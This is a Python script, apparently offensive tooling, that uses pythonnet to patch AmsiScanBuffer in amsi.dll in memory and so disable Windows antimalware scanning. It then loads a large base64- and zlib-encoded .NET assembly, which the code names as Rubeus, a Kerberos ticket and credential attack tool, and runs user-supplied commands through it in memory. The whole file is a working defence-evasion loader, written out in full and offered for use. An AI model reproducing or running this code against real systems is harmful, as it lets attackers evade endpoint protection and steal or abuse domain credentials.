import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def to_clr_array(py_list):
    """
    Converts a Python list to a .NET string array.
    Args:
        py_list: The Python list to convert.
    Returns:
        A .NET string array.
    """
    arr = System.Array.CreateInstance(System.String, len(py_list))
    for i, item in enumerate(py_list):
        arr[i] = item
    return arr

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    rubeus_program_type = assembly.GetType("Rubeus.Program")

    # You don't need to create an instance of the class for a static method
    method = rubeus_program_type.GetMethod("MainString")

    # Convert your command to a .NET string array
    command_args = to_clr_array([command])

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, help='Command to execute (like "help" or "triage")')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()